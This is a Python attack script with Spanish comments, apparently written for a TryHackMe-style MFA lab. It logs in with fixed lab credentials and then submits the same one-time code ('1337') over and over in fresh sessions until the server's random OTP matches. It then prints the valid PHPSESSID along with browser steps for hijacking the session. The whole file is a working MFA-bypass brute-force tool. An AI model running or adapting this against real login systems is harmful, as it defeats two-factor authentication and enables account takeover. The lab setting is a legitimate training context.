import requests
import sys
from typing import Optional, Dict

# --- Configuraci칩n Visual ---
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
RESET = "\033[0m"

# --- Headers de Navegaci칩n (Stealth Mode) ---
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Connection': 'close', # Forzamos cierre para no saturar sockets
    'Upgrade-Insecure-Requests': '1'
}

# Credenciales (Podr칤amos pedirlas tambi칠n, pero en este lab son fijas)
CREDENTIALS = {
    'email': 'thm@mail.thm',
    'password': 'test123'
}

# El OTP m치gico que esperamos que el servidor genere por azar
TARGET_OTP = "1337"

def get_target_url() -> str:
    """Solicita la URL al usuario y la normaliza."""
    print(f"{YELLOW}[?] Introduce la URL base del laboratorio (ej: http://mfa.thm/labs/third){RESET}")
    url = input(f"{YELLOW}>>> {RESET}").strip()
    
    # Quitamos la barra final si el usuario la puso, para evitar dobles slashes
    return url.rstrip('/')

def attack_logic(base_url: str):
    """Core del ataque de fuerza bruta estad칤stica."""
    
    # Construcci칩n din치mica de endpoints
    login_url = f"{base_url}/"
    otp_url = f"{base_url}/mfa"
    dashboard_path = "/labs/third/dashboard" # Path relativo esperado en la redirecci칩n

    print(f"\n{YELLOW}[*] Objetivo fijado: {base_url}")
    print(f"[*] Objetivo OTP: {TARGET_OTP}")
    print(f"[*] Iniciando secuencia de ataque... (Ctrl+C para cancelar){RESET}\n")

    attempt_count = 0

    while True:
        attempt_count += 1
        # Usamos una sesi칩n nueva en cada iteraci칩n para limpiar cookies anteriores
        session = requests.Session()
        
        try:
            # 1. Login Inicial
            # ---------------------------------------------------------
            login_resp = session.post(login_url, data=CREDENTIALS, headers=HEADERS, timeout=5)
            
            if login_resp.status_code != 200:
                print(f"{RED}[!] Error en login (Status: {login_resp.status_code}). URL correcta?{RESET}")
                time.sleep(1) # Peque침a pausa para no floodear si la URL est치 mal
                continue

            # 2. Env칤o del OTP
            # ---------------------------------------------------------
            # Desglosamos el OTP para el formato de este lab espec칤fico (code-1, code-2...)
            otp_payload = {
                f'code-{i+1}': digit for i, digit in enumerate(TARGET_OTP)
            }

            # IMPORTANTE: allow_redirects=False para interceptar el 302
            otp_resp = session.post(otp_url, data=otp_payload, headers=HEADERS, allow_redirects=False, timeout=5)

            # 3. An치lisis de la Respuesta
            # ---------------------------------------------------------
            if otp_resp.status_code == 302:
                location = otp_resp.headers.get('Location', '')
                
                # CHEQUEO DE 칄XITO
                if dashboard_path in location:
                    print(f"\n{GREEN}" + "="*60)
                    print(f" 游댠 춰BOOM! ACCESO CONSEGUIDO EN EL INTENTO #{attempt_count}")
                    print(f" ="*60)
                    print(f" [*] Cookie de Sesi칩n V치lida:")
                    print(f" {YELLOW}{session.cookies.get_dict()}{GREEN}")
                    print(f" ="*60 + f"{RESET}")
                    
                    # Extraer solo el valor para facilitar el copy-paste
                    phpsessid = session.cookies.get('PHPSESSID')
                    if phpsessid:
                        print(f"\n{YELLOW}Instrucci칩n r치pida:{RESET}")
                        print(f"1. Ve al navegador > F12 > Storage > Cookies")
                        print(f"2. Cambia el valor de PHPSESSID por: {GREEN}{phpsessid}{RESET}")
                        print(f"3. Navega a: {base_url}/dashboard\n")
                    
                    break # Fin del juego
                
                else:
                    # Redirecci칩n al login (fallo normal)
                    sys.stdout.write(f"\r{YELLOW}[*] Intento #{attempt_count}: Fallido (Redirigido a {location}){RESET}")
                    sys.stdout.flush()
            
            else:
                # Si no es 302, algo raro pasa (quiz치s p치gina de error o bloqueo)
                sys.stdout.write(f"\r{RED}[!] Intento #{attempt_count}: Respuesta inesperada ({otp_resp.status_code}){RESET}")
                sys.stdout.flush()

        except requests.exceptions.RequestException as e:
            print(f"\n{RED}[!] Error de conexi칩n: {e}{RESET}")
            break
        except KeyboardInterrupt:
            print(f"\n{RED}[!] Ataque abortado por el usuario.{RESET}")
            break

if __name__ == "__main__":
    try:
        # Check r치pido de dependencias
        import time 
        target = get_target_url()
        attack_logic(target)
    except KeyboardInterrupt:
        sys.exit(0)